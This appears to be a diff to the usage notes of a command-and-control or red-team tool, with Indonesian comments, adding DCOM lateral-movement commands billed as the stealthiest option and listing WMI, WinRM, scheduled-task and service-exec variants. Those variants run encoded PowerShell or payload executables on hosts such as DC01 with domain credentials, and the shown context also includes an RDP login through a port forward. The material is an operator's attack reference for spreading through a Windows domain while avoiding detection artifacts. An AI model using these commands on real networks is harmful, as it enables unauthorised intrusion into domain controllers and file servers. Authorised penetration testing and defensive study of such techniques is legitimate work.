@@ -157,10 +157,13 @@ portfwd stop fwd-1                                         # hapus session
 xfreerdp /v:localhost:33899 /u:CORP\\john.doe /p:'P@ss'
 
 # ─── LATERAL MOVEMENT ────────────────────────────────────────────────────────
+# DCOM (paling stealth, no service/schtask artifact, gunakan current/impersonated token)
+lateral dcom    <id> DC01   "powershell -enc <B64>"                     # default mmc20
+lateral dcom    <id> FS01   "C:\Temp\payload.exe" --method shellwindows  # butuh desktop session
 # WMI (fire-and-forget, tidak butuh WinRM)
-lateral wmi  <id> DC01   "cmd /c whoami > C:\Temp\o.txt" --user admin --domain CORP --pass 'P@ss'
+lateral wmi     <id> DC01   "cmd /c whoami > C:\Temp\o.txt" --user admin --domain CORP --pass 'P@ss'
 # WinRM (output di-capture, butuh PSRemoting enabled di target)
-lateral winrm <id> FS01  "hostname; net user" --user admin --domain CORP --pass 'P@ss' --wait
+lateral winrm   <id> FS01   "hostname; net user" --user admin --domain CORP --pass 'P@ss' --wait
 # Scheduled Task remote (berguna jika WMI diblokir)
 lateral schtask <id> 192.168.1.50 "powershell -enc <B64>" --user admin --domain CORP --pass 'P@ss'
 # Service exec (seperti PsExec, paling noisy)
